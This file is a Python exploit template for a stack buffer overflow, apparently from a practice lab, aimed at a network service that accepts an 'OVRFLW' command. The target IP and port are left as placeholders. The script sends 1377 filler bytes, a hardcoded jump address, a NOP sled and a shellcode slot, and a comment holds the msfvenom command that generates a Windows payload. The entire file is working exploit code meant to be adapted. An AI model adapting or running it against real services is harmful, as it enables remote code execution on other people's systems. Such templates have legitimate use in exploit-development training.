import socket, time, sys

ip = "XXXX" #CHANGE THIS
port = XXXX #CHANGE THIS
timeout = 5

pattern = "A" * 1377 # CHANGE THIS

# msfvenom -p windows/exec CMD=calc.exe -b "badchars" -f c

calc = ("SHELLCODE HERE")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
s.recv(1024)
print("Sending pattern of %s bytes" % len(pattern))
s.send("OVRFLW " + pattern + "\x83\x66\x52\x56" + 16 * "\x90" + calc) #  DON'T FORGET TO CHANGE THE JMP POINT ADDRESS TO LITTLE ENDIAN
s.recv(1024)
s.close()
